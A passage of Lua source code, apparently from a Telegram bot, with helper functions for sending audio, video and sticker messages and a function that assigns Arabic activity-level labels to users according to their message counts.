local input_message_content = { ID = "InputMessageAudio", audio_ = getInputFile(audio), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVideo(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, video, duration, width, height, caption, cb, cmd)    
local input_message_content = { ID = "InputMessageVideo",      video_ = getInputFile(video),      added_sticker_file_ids_ = {},      duration_ = duration or 0,      width_ = width or 0,      height_ = height or 0,      caption_ = caption    }    sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)  
end
local sendSticker = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker)
local input_message_content = { ID = "InputMessageSticker", sticker_ = getInputFile(sticker), width_ = 0, height_ = 0 } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end 
function formsgs(msgs) 
local MsgText = ''  
if tonumber(msgs) < 100 then 
MsgText = 'جدا ضعيف' 
elseif tonumber(msgs) < 250 then 
MsgText = 'ضعيف' 
elseif tonumber(msgs) < 500 then 
MsgText = 'غير متفاعل' 
elseif tonumber(msgs) < 750 then 
MsgText = 'متوسط' 
elseif tonumber(msgs) < 1000 then 
MsgText = 'متفاعل' 
elseif tonumber(msgs) < 2000 then 
MsgText = 'قمة التفاعل' 
elseif tonumber(msgs) < 3000 then 
MsgText = 'ملك التفاعل'  
elseif tonumber(msgs) < 4000 then 
MsgText = 'اسطورة التفاعل' 
elseif tonumber(msgs) < 5000 then 
MsgText = 'متفاعل نار' 
elseif tonumber(msgs) < 6000 then 
MsgText = 'يجدح جدح' 
elseif tonumber(msgs) < 7000 then 
MsgText = 'خيالي' 
elseif tonumber(msgs) < 8000 then 
MsgText = 'رب التفاعل' 
elseif tonumber(msgs) < 9000 then 
MsgText = 'كافر بالتفاعل' 
elseif tonumber(msgs) < 10000000000 then 
MsgText = "معلك لربك" 
end 
